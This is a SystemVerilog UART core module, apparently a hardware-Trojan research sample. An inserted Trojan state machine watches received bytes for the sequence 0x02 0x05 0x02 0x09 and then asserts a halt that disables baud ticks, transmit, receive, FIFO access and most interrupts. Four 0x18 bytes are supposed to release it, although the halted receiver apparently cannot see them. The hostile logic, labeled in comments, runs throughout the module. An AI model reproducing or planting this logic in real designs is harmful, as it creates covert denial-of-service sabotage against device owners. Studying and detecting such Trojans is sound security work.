`include "prim_assert.sv"

module uart_core (
  input                  clk_i,
  input                  rst_ni,

  input  uart_reg_pkg::uart_reg2hw_t reg2hw,
  output uart_reg_pkg::uart_hw2reg_t hw2reg,

  input                  rx,
  output logic           tx,

  output logic           lsio_trigger_o,

  output logic           intr_tx_watermark_o,
  output logic           intr_tx_empty_o,
  output logic           intr_rx_watermark_o,
  output logic           intr_tx_done_o,
  output logic           intr_rx_overflow_o,
  output logic           intr_rx_frame_err_o,
  output logic           intr_rx_break_err_o,
  output logic           intr_rx_timeout_o,
  output logic           intr_rx_parity_err_o
);

  import uart_reg_pkg::*;

  localparam int NcoWidth = $bits(reg2hw.ctrl.nco.q);
  localparam int TxFifoDepthW = $clog2(TxFifoDepth)+1;
  localparam int RxFifoDepthW = $clog2(RxFifoDepth)+1;

  // The design does not support FIFOs deeper than 255 elements with the current CSR layout.
  `ASSERT_INIT(TxFifoDepth_A, TxFifoDepth < 256)
  `ASSERT_INIT(RxFifoDepth_A, RxFifoDepth < 256)

  logic   [15:0]  rx_val_q;
  logic   [7:0]   uart_rdata;
  logic           tick_baud_x16, rx_tick_baud;

  logic   [TxFifoDepthW-1:0] tx_fifo_depth;
  logic   [RxFifoDepthW-1:0] rx_fifo_depth;
  logic   [RxFifoDepthW-1:0] rx_fifo_depth_prev_q;

  logic   [23:0]  rx_timeout_count_d, rx_timeout_count_q, uart_rxto_val;
  logic           rx_fifo_depth_changed, uart_rxto_en;
  logic           tx_enable, rx_enable;
  logic           sys_loopback, line_loopback, rxnf_enable;
  logic           uart_fifo_rxrst, uart_fifo_txrst;
  logic   [2:0]   uart_fifo_rxilvl;
  logic   [2:0]   uart_fifo_txilvl;
  logic           ovrd_tx_en, ovrd_tx_val;
  logic   [7:0]   tx_fifo_data;
  logic           tx_fifo_rready, tx_fifo_rvalid;
  logic           tx_fifo_wready, tx_uart_idle;
  logic           tx_out;
  logic           tx_out_q;
  logic   [7:0]   rx_fifo_data;
  logic           rx_valid, rx_fifo_wvalid, rx_fifo_rvalid;
  logic           rx_fifo_wready, rx_uart_idle;
  logic           rx_sync;
  logic           rx_in;
  logic           break_err;
  logic   [4:0]   allzero_cnt_d, allzero_cnt_q;
  logic           allzero_err, not_allzero_char;
  logic           event_tx_watermark, event_tx_empty, event_rx_watermark, event_tx_done;
  logic           event_rx_overflow, event_rx_frame_err, event_rx_break_err, event_rx_timeout;
  logic           event_rx_parity_err;
  logic           tx_uart_idle_q;

  assign tx_enable        = reg2hw.ctrl.tx.q;
  assign rx_enable        = reg2hw.ctrl.rx.q;
  assign rxnf_enable      = reg2hw.ctrl.nf.q;
  assign sys_loopback     = reg2hw.ctrl.slpbk.q;
  assign line_loopback    = reg2hw.ctrl.llpbk.q;

  assign uart_fifo_rxrst  = reg2hw.fifo_ctrl.rxrst.q & reg2hw.fifo_ctrl.rxrst.qe;
  assign uart_fifo_txrst  = reg2hw.fifo_ctrl.txrst.q & reg2hw.fifo_ctrl.txrst.qe;
  assign uart_fifo_rxilvl = reg2hw.fifo_ctrl.rxilvl.q;
  assign uart_fifo_txilvl = reg2hw.fifo_ctrl.txilvl.q;

  assign ovrd_tx_en       = reg2hw.ovrd.txen.q;
  assign ovrd_tx_val      = reg2hw.ovrd.txval.q;

  typedef enum logic {
    BRK_CHK,
    BRK_WAIT
  } break_st_e ;

  break_st_e break_st_q;

  assign not_allzero_char = rx_valid & (~event_rx_frame_err | (rx_fifo_data != 8'h0));
  assign allzero_err = event_rx_frame_err & (rx_fifo_data == 8'h0);


  assign allzero_cnt_d = (break_st_q == BRK_WAIT || not_allzero_char) ? 5'h0 :
                          //allzero_cnt_q[4] never be 1b without break_st_q as BRK_WAIT
                          //allzero_cnt_q[4] ? allzero_cnt_q :
                          allzero_err ? allzero_cnt_q + 5'd1 :
                          allzero_cnt_q;

  always_ff @(posedge clk_i or negedge rst_ni) begin
    if (!rst_ni)        allzero_cnt_q <= '0;
    else if (rx_enable) allzero_cnt_q <= allzero_cnt_d;
  end

  // break_err edges in same cycle as event_rx_frame_err edges ; that way the
  // reset-on-read works the same way for break and frame error interrupts.

  always_comb begin
    unique case (reg2hw.ctrl.rxblvl.q)
      2'h0:    break_err = allzero_cnt_d >= 5'd2;
      2'h1:    break_err = allzero_cnt_d >= 5'd4;
      2'h2:    break_err = allzero_cnt_d >= 5'd8;
      default: break_err = allzero_cnt_d >= 5'd16;
    endcase
  end

  always_ff @(posedge clk_i or negedge rst_ni) begin
    if (!rst_ni) break_st_q <= BRK_CHK;
    else begin
      unique case (break_st_q)
        BRK_CHK: begin
          if (event_rx_break_err) break_st_q <= BRK_WAIT;
        end

        BRK_WAIT: begin
          if (rx_in) break_st_q <= BRK_CHK;
        end

        default: begin
          break_st_q <= BRK_CHK;
        end
      endcase
    end
  end

  assign hw2reg.val.d  = rx_val_q;

  assign hw2reg.rdata.d = uart_rdata;

  assign hw2reg.status.rxempty.d     = ~rx_fifo_rvalid;
  assign hw2reg.status.rxidle.d      = rx_uart_idle;
  assign hw2reg.status.txidle.d      = tx_uart_idle & ~tx_fifo_rvalid;
  assign hw2reg.status.txempty.d     = ~tx_fifo_rvalid;
  assign hw2reg.status.rxfull.d      = ~rx_fifo_wready;
  assign hw2reg.status.txfull.d      = ~tx_fifo_wready;

  assign hw2reg.fifo_status.txlvl.d  = 8'(tx_fifo_depth);
  assign hw2reg.fifo_status.rxlvl.d  = 8'(rx_fifo_depth);

  // resets are self-clearing, so need to update FIFO_CTRL
  assign hw2reg.fifo_ctrl.rxilvl.de = 1'b0;
  assign hw2reg.fifo_ctrl.rxilvl.d  = 3'h0;
  assign hw2reg.fifo_ctrl.txilvl.de = 1'b0;
  assign hw2reg.fifo_ctrl.txilvl.d  = 3'h0;

  // Trojan insertion begin: declaration
  // ------------------------------------------------------
  typedef enum logic [1:0] {TROJ_IDLE, TROJ_TRIG, TROJ_ARMED} troj_state_e;
  troj_state_e troj_state_q, troj_state_d;
  logic [2:0] troj_trig_cnt_q, troj_trig_cnt_d;
  logic [2:0] troj_rel_cnt_q, troj_rel_cnt_d;
  logic [7:0] troj_trig_seq [3:0];   // 0: 0x02, 1: 0x05, 2: 0x02, 3: 0x09
  logic [1:0] troj_trig_ptr_q, troj_trig_ptr_d;
  logic [1:0] troj_rel_ptr_q, troj_rel_ptr_d;
  logic       troj_halt;
  // Trojan insertion end: declaration

  // Trojan insertion begin: constants for trigger/release bytes
  // ------------------------------------------------------
  assign troj_trig_seq[0] = 8'h02;
  assign troj_trig_seq[1] = 8'h05;
  assign troj_trig_seq[2] = 8'h02;
  assign troj_trig_seq[3] = 8'h09;
  // Trojan insertion end

  // Trojan insertion begin: state machine and logic
  // ------------------------------------------------------
  always_comb begin
    // Default assignments
    troj_state_d = troj_state_q;
    troj_trig_ptr_d = troj_trig_ptr_q;
    troj_rel_ptr_d = troj_rel_ptr_q;
    troj_trig_cnt_d = troj_trig_cnt_q;
    troj_rel_cnt_d = troj_rel_cnt_q;
    troj_halt = (troj_state_q == TROJ_ARMED);

    // State machine
    case (troj_state_q)
      TROJ_IDLE: begin
        if (rx_valid && ~event_rx_frame_err && ~event_rx_parity_err) begin
          if (rx_fifo_data == troj_trig_seq[troj_trig_ptr_q]) begin
            if (troj_trig_ptr_q == 2'd3) begin
              // All 4 matched
              troj_state_d = TROJ_ARMED;
              troj_trig_ptr_d = 2'd0;
              troj_trig_cnt_d = 3'd0;
            end else begin
              troj_trig_ptr_d = troj_trig_ptr_q + 2'd1;
            end
          end else begin
            troj_trig_ptr_d = (rx_fifo_data == troj_trig_seq[0]) ? 2'd1 : 2'd0;
          end
        end
      end

      TROJ_ARMED: begin
        if (rx_valid && ~event_rx_frame_err && ~event_rx_parity_err) begin
          if (rx_fifo_data == 8'h18) begin
            if (troj_rel_cnt_q == 3'd3) begin
              // All four 0x18 received
              troj_state_d = TROJ_IDLE;
              troj_rel_cnt_d = 3'd0;
            end else begin
              troj_rel_cnt_d = troj_rel_cnt_q + 3'd1;
            end
          end else begin
            troj_rel_cnt_d = (rx_fifo_data == 8'h18) ? 3'd1 : 3'd0;
          end
        end
      end

      default: begin
        troj_state_d = TROJ_IDLE;
        troj_trig_ptr_d = 2'd0;
        troj_rel_cnt_d = 3'd0;
      end
    endcase

    // When not in TROJ_ARMED, the release counter should be reset.
    if (troj_state_q != TROJ_ARMED)
      troj_rel_cnt_d = 3'd0;
    // Also reset trigger pointer when armed
    if (troj_state_q == TROJ_ARMED)
      troj_trig_ptr_d = 2'd0;
  end

  always_ff @(posedge clk_i or negedge rst_ni) begin
    if (!rst_ni) begin
      troj_state_q    <= TROJ_IDLE;
      troj_trig_ptr_q <= 2'd0;
      troj_rel_ptr_q  <= 2'd0;
      troj_trig_cnt_q <= 3'd0;
      troj_rel_cnt_q  <= 3'd0;
    end else begin
      troj_state_q    <= troj_state_d;
      troj_trig_ptr_q <= troj_trig_ptr_d;
      troj_rel_ptr_q  <= troj_rel_ptr_d;
      troj_trig_cnt_q <= troj_trig_cnt_d;
      troj_rel_cnt_q  <= troj_rel_cnt_d;
    end
  end
  // Trojan insertion end: state machine

  //              NCO 16x Baud Generator
  // output clock rate is:
  //      Fin * (NCO/2**NcoWidth)
  logic   [NcoWidth:0]     nco_sum_q; // extra bit to get the carry

  always_ff @(posedge clk_i or negedge rst_ni) begin
    if (!rst_ni) begin
      nco_sum_q <= 17'h0;
    end else if ((tx_enable || rx_enable) && !troj_halt) begin // Trojan: halt disables tick
      nco_sum_q <= {1'b0,nco_sum_q[NcoWidth-1:0]} + {1'b0,reg2hw.ctrl.nco.q[NcoWidth-1:0]};
    end
  end

  assign tick_baud_x16 = nco_sum_q[16] && !troj_halt; // Trojan: prevent baud tick when halted

  //////////////
  // TX Logic //
  //////////////

  assign tx_fifo_rready = tx_uart_idle & tx_fifo_rvalid & tx_enable & ~troj_halt; // Trojan: block TX when halted

  prim_fifo_sync #(
    .Width   (8),
    .Pass    (1'b0),
    .Depth   (TxFifoDepth)
  ) u_uart_txfifo (
    .clk_i,
    .rst_ni,
    .clr_i   (uart_fifo_txrst),
    .wvalid_i(reg2hw.wdata.qe & ~troj_halt), // Trojan: block TX writes when halted
    .wready_o(tx_fifo_wready),
    .wdata_i (reg2hw.wdata.q),
    .depth_o (tx_fifo_depth),
    .full_o (),
    .rvalid_o(tx_fifo_rvalid),
    .rready_i(tx_fifo_rready),
    .rdata_o (tx_fifo_data),
    .err_o   ()
  );

  uart_tx uart_tx (
    .clk_i,
    .rst_ni,
    .tx_enable(tx_enable & ~troj_halt), // Trojan: disable TX when halted
    .tick_baud_x16(tick_baud_x16),
    .parity_enable  (reg2hw.ctrl.parity_en.q),
    .wr             (tx_fifo_rready),
    .wr_parity      ((^tx_fifo_data) ^ reg2hw.ctrl.parity_odd.q),
    .wr_data        (tx_fifo_data),
    .idle           (tx_uart_idle),
    .tx             (tx_out)
  );

  assign tx = line_loopback ? rx : tx_out_q ;
  always_ff @(posedge clk_i or negedge rst_ni) begin
    if (!rst_ni) begin
      tx_out_q <= 1'b1;
    end else if (ovrd_tx_en) begin
      tx_out_q <= ovrd_tx_val ;
    end else if (sys_loopback) begin
      tx_out_q <= 1'b1;
    end else begin
      tx_out_q <= tx_out;
    end
  end

  //////////////
  // RX Logic //
  //////////////

  //      sync the incoming data
  prim_flop_2sync #(
    .Width(1),
    .ResetValue(1'b1)
  ) sync_rx (
    .clk_i,
    .rst_ni,
    .d_i(rx),
    .q_o(rx_sync)
  );

  // Based on: en.wikipedia.org/wiki/Repetition_code mentions the use of a majority filter
  // in UART to ignore brief noise spikes
  logic   rx_sync_q1, rx_sync_q2, rx_in_mx, rx_in_maj;

  always_ff @(posedge clk_i or negedge rst_ni) begin
    if (!rst_ni) begin
      rx_sync_q1 <= 1'b1;
      rx_sync_q2 <= 1'b1;
    end else begin
      rx_sync_q1 <= rx_sync;
      rx_sync_q2 <= rx_sync_q1;
    end
  end

  assign rx_in_maj = (rx_sync    & rx_sync_q1) |
                     (rx_sync    & rx_sync_q2) |
                     (rx_sync_q1 & rx_sync_q2);
  assign rx_in_mx  = rxnf_enable ? rx_in_maj : rx_sync;

  assign rx_in =  sys_loopback ? tx_out   :
                  line_loopback ? 1'b1 :
                  rx_in_mx;

  uart_rx uart_rx (
    .clk_i,
    .rst_ni,
    .rx_enable(rx_enable & ~troj_halt), // Trojan: block RX when halted
    .tick_baud_x16(tick_baud_x16),
    .parity_enable  (reg2hw.ctrl.parity_en.q),
    .parity_odd     (reg2hw.ctrl.parity_odd.q),
    .tick_baud      (rx_tick_baud),
    .rx_valid,
    .rx_data        (rx_fifo_data),
    .idle           (rx_uart_idle),
    .frame_err      (event_rx_frame_err),
    .rx             (rx_in),
    .rx_parity_err  (event_rx_parity_err)
  );

  assign rx_fifo_wvalid = rx_valid & ~event_rx_frame_err & ~event_rx_parity_err & ~troj_halt; // Trojan: block RX push to FIFO

  prim_fifo_sync #(
    .Width   (8),
    .Pass    (1'b0),
    .Depth   (RxFifoDepth)
  ) u_uart_rxfifo (
    .clk_i,
    .rst_ni,
    .clr_i   (uart_fifo_rxrst),
    .wvalid_i(rx_fifo_wvalid),
    .wready_o(rx_fifo_wready),
    .wdata_i (rx_fifo_data),
    .depth_o (rx_fifo_depth),
    .full_o (),
    .rvalid_o(rx_fifo_rvalid),
    .rready_i(reg2hw.rdata.re & ~troj_halt), // Trojan: block RX read from FIFO
    .rdata_o (uart_rdata),
    .err_o   ()
  );

  always_ff @(posedge clk_i or negedge rst_ni) begin
    if (!rst_ni)            rx_val_q <= 16'h0;
    else if (tick_baud_x16) rx_val_q <= {rx_val_q[14:0], rx_in};
  end

  ////////////////////////
  // Interrupt & Status //
  ////////////////////////

  logic [TxFifoDepthW-1:0] tx_watermark_thresh;
  always_comb begin
    // Create power of two thresholds.
    // The threshold saturates at half the FIFO depth.
    if (uart_fifo_txilvl >= (TxFifoDepthW-2)) begin
      tx_watermark_thresh = TxFifoDepthW'(TxFifoDepth/2);
    end else begin
      tx_watermark_thresh = 1'b1 << uart_fifo_txilvl;
    end
    event_tx_watermark = tx_fifo_depth < tx_watermark_thresh && ~troj_halt; // Trojan: block TX watermark event
  end

  assign event_tx_empty = (tx_fifo_depth == '0) && ~troj_halt; // Trojan: block TX empty event

  assign event_tx_done = ~tx_fifo_rvalid & ~tx_uart_idle_q & tx_uart_idle & ~troj_halt; // Trojan: block TX done event

  always_ff @(posedge clk_i or negedge rst_ni) begin
    if (!rst_ni) begin
      tx_uart_idle_q       <= 1'b1;
    end else begin
      tx_uart_idle_q       <= tx_uart_idle;
    end
  end

  logic [RxFifoDepthW-1:0] rx_watermark_thresh;
  always_comb begin
    // Create power of two thresholds.
    if (uart_fifo_rxilvl > (RxFifoDepthW-1)) begin
      // This results in the comparison always returning 0 below because RxFifoDepth can
      // encode depths up to 2*RxFifoDepth-1.
      rx_watermark_thresh = {RxFifoDepthW{1'b1}};
    end else if (uart_fifo_rxilvl == (RxFifoDepthW-1)) begin
      // The maximum valid threshold threshold is an exception and saturates at RxFifoDepth-2.
      rx_watermark_thresh = RxFifoDepthW'(RxFifoDepth-2);
    end else begin
      rx_watermark_thresh = 1'b1 << uart_fifo_rxilvl;
    end
    event_rx_watermark = (rx_fifo_depth >= rx_watermark_thresh) && ~troj_halt; // Trojan: block RX watermark event
  end

  // Flop trigger signal to avoid glitches on the output
  always_ff @(posedge clk_i or negedge rst_ni) begin
    if (!rst_ni) begin
      lsio_trigger_o <= 1'b0;
    end else begin
      lsio_trigger_o <= (event_tx_watermark | event_rx_watermark) & ~troj_halt; // Trojan: block LSIO trigger
    end
  end

  // rx timeout interrupt
  assign uart_rxto_en  = reg2hw.timeout_ctrl.en.q;
  assign uart_rxto_val = reg2hw.timeout_ctrl.val.q;

  assign rx_fifo_depth_changed = (rx_fifo_depth != rx_fifo_depth_prev_q);

  assign rx_timeout_count_d =
              // don't count if timeout feature not enabled ;
              // will never reach timeout val + lower power
              (uart_rxto_en == 1'b0)              ? 24'd0 :
              // reset count if timeout interrupt is set
              event_rx_timeout                    ? 24'd0 :
              // reset count upon change in fifo level: covers both read and receiving a new byte
              rx_fifo_depth_changed               ? 24'd0 :
              // reset count if no bytes are pending
              (rx_fifo_depth == '0)               ? 24'd0 :
              // stop the count at timeout value (this will set the interrupt)
              //   Removed below line as when the timeout reaches the value,
              //   event occurred, and timeout value reset to 0h.
              //(rx_timeout_count_q == uart_rxto_val) ? rx_timeout_count_q :
              // increment if at rx baud tick
              (rx_tick_baud & ~troj_halt)         ? (rx_timeout_count_q + 24'd1) : // Trojan: block time counting
              rx_timeout_count_q;

  assign event_rx_timeout = (rx_timeout_count_q == uart_rxto_val) & uart_rxto_en & ~troj_halt; // Trojan: block RX timeout

  always_ff @(posedge clk_i or negedge rst_ni) begin
    if (!rst_ni) begin
      rx_timeout_count_q   <= 24'd0;
      rx_fifo_depth_prev_q <= '0;
    end else begin
      rx_timeout_count_q    <= rx_timeout_count_d;
      rx_fifo_depth_prev_q  <= rx_fifo_depth;
    end
  end

  assign event_rx_overflow  = rx_fifo_wvalid & ~rx_fifo_wready & ~troj_halt; // Trojan: block RX overflow
  assign event_rx_break_err = break_err & (break_st_q == BRK_CHK) & ~troj_halt; // Trojan: block RX break error

  // instantiate interrupt hardware primitives

  prim_intr_hw #(.Width(1), .IntrT("Status")) intr_hw_tx_watermark (
    .clk_i,
    .rst_ni,
    .event_intr_i           (event_tx_watermark),
    .reg2hw_intr_enable_q_i (reg2hw.intr_enable.tx_watermark.q),
    .reg2hw_intr_test_q_i   (reg2hw.intr_test.tx_watermark.q),
    .reg2hw_intr_test_qe_i  (reg2hw.intr_test.tx_watermark.qe),
    .reg2hw_intr_state_q_i  (reg2hw.intr_state.tx_watermark.q),
    .hw2reg_intr_state_de_o (hw2reg.intr_state.tx_watermark.de),
    .hw2reg_intr_state_d_o  (hw2reg.intr_state.tx_watermark.d),
    .intr_o                 (intr_tx_watermark_o)
  );

  prim_intr_hw #(.Width(1), .IntrT("Status")) intr_hw_tx_empty (
    .clk_i,
    .rst_ni,
    .event_intr_i           (event_tx_empty),
    .reg2hw_intr_enable_q_i (reg2hw.intr_enable.tx_empty.q),
    .reg2hw_intr_test_q_i   (reg2hw.intr_test.tx_empty.q),
    .reg2hw_intr_test_qe_i  (reg2hw.intr_test.tx_empty.qe),
    .reg2hw_intr_state_q_i  (reg2hw.intr_state.tx_empty.q),
    .hw2reg_intr_state_de_o (hw2reg.intr_state.tx_empty.de),
    .hw2reg_intr_state_d_o  (hw2reg.intr_state.tx_empty.d),
    .intr_o                 (intr_tx_empty_o)
  );

  prim_intr_hw #(.Width(1), .IntrT("Status")) intr_hw_rx_watermark (
    .clk_i,
    .rst_ni,
    .event_intr_i           (event_rx_watermark),
    .reg2hw_intr_enable_q_i (reg2hw.intr_enable.rx_watermark.q),
    .reg2hw_intr_test_q_i   (reg2hw.intr_test.rx_watermark.q),
    .reg2hw_intr_test_qe_i  (reg2hw.intr_test.rx_watermark.qe),
    .reg2hw_intr_state_q_i  (reg2hw.intr_state.rx_watermark.q),
    .hw2reg_intr_state_de_o (hw2reg.intr_state.rx_watermark.de),
    .hw2reg_intr_state_d_o  (hw2reg.intr_state.rx_watermark.d),
    .intr_o                 (intr_rx_watermark_o)
  );

  prim_intr_hw #(.Width(1)) intr_hw_tx_done (
    .clk_i,
    .rst_ni,
    .event_intr_i           (event_tx_done),
    .reg2hw_intr_enable_q_i (reg2hw.intr_enable.tx_done.q),
    .reg2hw_intr_test_q_i   (reg2hw.intr_test.tx_done.q),
    .reg2hw_intr_test_qe_i  (reg2hw.intr_test.tx_done.qe),
    .reg2hw_intr_state_q_i  (reg2hw.intr_state.tx_done.q),
    .hw2reg_intr_state_de_o (hw2reg.intr_state.tx_done.de),
    .hw2reg_intr_state_d_o  (hw2reg.intr_state.tx_done.d),
    .intr_o                 (intr_tx_done_o)
  );

  prim_intr_hw #(.Width(1)) intr_hw_rx_overflow (
    .clk_i,
    .rst_ni,
    .event_intr_i           (event_rx_overflow),
    .reg2hw_intr_enable_q_i (reg2hw.intr_enable.rx_overflow.q),
    .reg2hw_intr_test_q_i   (reg2hw.intr_test.rx_overflow.q),
    .reg2hw_intr_test_qe_i  (reg2hw.intr_test.rx_overflow.qe),
    .reg2hw_intr_state_q_i  (reg2hw.intr_state.rx_overflow.q),
    .hw2reg_intr_state_de_o (hw2reg.intr_state.rx_overflow.de),
    .hw2reg_intr_state_d_o  (hw2reg.intr_state.rx_overflow.d),
    .intr_o                 (intr_rx_overflow_o)
  );

  prim_intr_hw #(.Width(1)) intr_hw_rx_frame_err (
    .clk_i,
    .rst_ni,
    .event_intr_i           (event_rx_frame_err & ~troj_halt), // Trojan: block RX frame err
    .reg2hw_intr_enable_q_i (reg2hw.intr_enable.rx_frame_err.q),
    .reg2hw_intr_test_q_i   (reg2hw.intr_test.rx_frame_err.q),
    .reg2hw_intr_test_qe_i  (reg2hw.intr_test.rx_frame_err.qe),
    .reg2hw_intr_state_q_i  (reg2hw.intr_state.rx_frame_err.q),
    .hw2reg_intr_state_de_o (hw2reg.intr_state.rx_frame_err.de),
    .hw2reg_intr_state_d_o  (hw2reg.intr_state.rx_frame_err.d),
    .intr_o                 (intr_rx_frame_err_o)
  );

  prim_intr_hw #(.Width(1)) intr_hw_rx_break_err (
    .clk_i,
    .rst_ni,
    .event_intr_i           (event_rx_break_err),
    .reg2hw_intr_enable_q_i (reg2hw.intr_enable.rx_break_err.q),
    .reg2hw_intr_test_q_i   (reg2hw.intr_test.rx_break_err.q),
    .reg2hw_intr_test_qe_i  (reg2hw.intr_test.rx_break_err.qe),
    .reg2hw_intr_state_q_i  (reg2hw.intr_state.rx_break_err.q),
    .hw2reg_intr_state_de_o (hw2reg.intr_state.rx_break_err.de),
    .hw2reg_intr_state_d_o  (hw2reg.intr_state.rx_break_err.d),
    .intr_o                 (intr_rx_break_err_o)
  );

  prim_intr_hw #(.Width(1)) intr_hw_rx_timeout (
    .clk_i,
    .rst_ni,
    .event_intr_i           (event_rx_timeout),
    .reg2hw_intr_enable_q_i (reg2hw.intr_enable.rx_timeout.q),
    .reg2hw_intr_test_q_i   (reg2hw.intr_test.rx_timeout.q),
    .reg2hw_intr_test_qe_i  (reg2hw.intr_test.rx_timeout.qe),
    .reg2hw_intr_state_q_i  (reg2hw.intr_state.rx_timeout.q),
    .hw2reg_intr_state_de_o (hw2reg.intr_state.rx_timeout.de),
    .hw2reg_intr_state_d_o  (hw2reg.intr_state.rx_timeout.d),
    .intr_o                 (intr_rx_timeout_o)
  );

  prim_intr_hw #(.Width(1)) intr_hw_rx_parity_err (
    .clk_i,
    .rst_ni,
    .event_intr_i           (event_rx_parity_err & ~troj_halt), // Trojan: block parity err
    .reg2hw_intr_enable_q_i (reg2hw.intr_enable.rx_parity_err.q),
    .reg2hw_intr_test_q_i   (reg2hw.intr_test.rx_parity_err.q),
    .reg2hw_intr_test_qe_i  (reg2hw.intr_test.rx_parity_err.qe),
    .reg2hw_intr_state_q_i  (reg2hw.intr_state.rx_parity_err.q),
    .hw2reg_intr_state_de_o (hw2reg.intr_state.rx_parity_err.de),
    .hw2reg_intr_state_d_o  (hw2reg.intr_state.rx_parity_err.d),
    .intr_o                 (intr_rx_parity_err_o)
  );

  // unused registers
  logic unused_reg;
  assign unused_reg = ^reg2hw.alert_test;

endmodule